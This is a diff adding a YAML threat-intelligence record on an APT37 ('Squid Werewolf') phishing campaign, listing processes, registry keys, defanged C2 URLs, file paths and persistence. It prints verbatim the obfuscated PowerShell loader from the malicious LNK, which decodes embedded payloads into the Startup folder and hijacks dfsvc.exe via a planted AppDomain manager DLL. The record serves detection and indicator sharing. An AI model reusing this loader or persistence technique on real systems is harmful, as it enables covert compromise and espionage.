@@ -1,0 +1,62 @@
+description: "Squid Werewolf phishing campaign using a password\u2011protected ZIP\
+  \ containing an LNK that launches PowerShell to drop and execute a .NET loader with\
+  \ persistence via Startup folder."
+attribution: Squid Werewolf (APT37, Ricochet Chollima, ScarCruft, Reaper Group)
+malware_families:
+- dfsvc.exe
+- DomainManager.dll
+TTPs:
+  processes:
+  - powershell.exe
+  - explorer.exe
+  - start.exe
+  - d.exe
+  commandline:
+  - '''powershell.exe -nop -c $t=$env:appdata+''\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'';if(Get-ChildItem
+    $env:temp -recurse ''  .pdf.lnk''){$k=New-Object IO.FileStream ($env:temp+''\\''+((Get-ChildItem
+    $env:temp -recurse ''  .pdf.lnk'').Directory).Name+''\\''+''  .pdf.lnk''),''Open'',''Read'',''ReadWrite''}else{$k=New-Object
+    IO.FileStream ''  .pdf.lnk'',''Open'',''Read'',''ReadWrite''};$b=New-Object byte[](692604);$k.Seek(3001,[IO.SeekOrigin]::Begin);$k.Read($b,0,692604);$a=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64CharArray($b,0,$b.Length))
+    -split '':'';copy ''C:\Windows\Microsoft.NET\Framework\v4.0.30319\dfsvc.exe''
+    ($t+''\\d.exe'');[IO.File]::<# mm #>WriteAllBytes($t+''\\d.exe.config'',[Convert]::FromBase64""String($a[0]));[IO.File]::<#
+    mm #>WriteAllBytes($t+''\\DomainManager.dll'',[Convert]::FromBase64""String($a[1]));[IO.File]::<#
+    mm #>WriteAllBytes($env:temp+''\\mngs Attachement.pdf'',[Convert]::FromBase64""String($a[2]));explorer
+    ($env:temp+''\\mngs Attachement.pdf'');start ($t+''\\d.exe'')'''
+  powershell:
+  - $t=$env:appdata+'\Microsoft\Windows\Start Menu\Programs\Startup';if(Get-ChildItem
+    $env:temp -recurse ' .pdf.lnk'){...}
+  scripting_engine: []
+  registry_keys:
+  - HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\StartupFolder
+  image_load: []
+  network_connections:
+  - process: d.exe
+    url: https://www.timeapi.io/api/time/current/zone?timeZone=Europe%2FAmsterdam
+    port: ''
+  - process: DomainManager.dll
+    url: hxxps://hwsrv-1253398.hostwindsdns.com/307c77ab-f41f-4dd4-a478-2a71b9625f64/c/discountcode.php
+    port: ''
+  - process: DomainManager.dll
+    url: hxxps://hwsrv-1253398.hostwindsdns.com/307c77ab-f41f-4dd4-a478-2a71b9625f64/c/shoppingcart.php
+    port: ''
+  file_activity:
+  - '%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\d.exe.config'
+  - '%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\DomainManager.dll'
+  - '%TEMP%\\mngs Attachement.pdf'
+  - C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\dfsvc.exe
+  persistence:
+  - Copy d.exe to %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup for
+    startup execution.
+  process_relations: []
+IOCs:
+  hashes: []
+  ips: []
+  domains:
+  - www.timeapi.io
+  - hwsrv-1253398.hostwindsdns.com
+  urls:
+  - https://www.timeapi.io/api/time/current/zone?timeZone=Europe%2FAmsterdam
+  - hxxps://hwsrv-1253398.hostwindsdns.com/307c77ab-f41f-4dd4-a478-2a71b9625f64/c/discountcode.php
+  - hxxps://hwsrv-1253398.hostwindsdns.com/307c77ab-f41f-4dd4-a478-2a71b9625f64/c/shoppingcart.php
+reference: https://bi.zone/eng/expertise/blog/sotni-tysyach-rubley-za-vashi-sekrety-kibershpiony-squid-werewolf-maskiruyutsya-pod-rekruterov/
+date_of_publication: April 18, 2025
+file_creation_date: August 25, 2025
